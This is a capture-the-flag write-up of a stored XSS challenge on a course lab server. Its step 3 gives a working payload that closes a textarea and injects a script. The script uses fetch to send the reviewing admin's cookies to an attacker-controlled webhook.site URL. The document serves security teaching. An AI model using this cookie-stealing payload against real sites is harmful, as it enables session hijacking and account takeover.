# Challenge `Go on and censor my posts` writeup

- Vulnerability: XSS
- Where: `http://mustard.stt.rnl.tecnico.ulisboa.pt:22253` new blogpost content box
- Impact: Allows an attacker to inject malicious code in the webpage

## Steps to reproduce

1. Get a URL in [Webhook](https://webhook.site/) to collect your http requests
2. Write a random unused title in the 'Title' box and write something (whatever) in the 'Content' box, and click `Create Post`, you'll be redirected to a new page to update the blogpost
3. Write the script `</textarea><script>fetch("`_`<your_webhook_url>`_`?cookie="+document.cookie)</script>` in the 'Content' box and click `Update post and send it for admin review`
4. The admin will execute the script, sending a http request to your Webhook URL with his cookies

__Note: In step 3, `</textarea>` is needed to close the tag, so that the following script is not interpreted as text, but rather as code that will be executed__

[(POC)](pocs/go_on_and_censor_my_posts_poc.py)
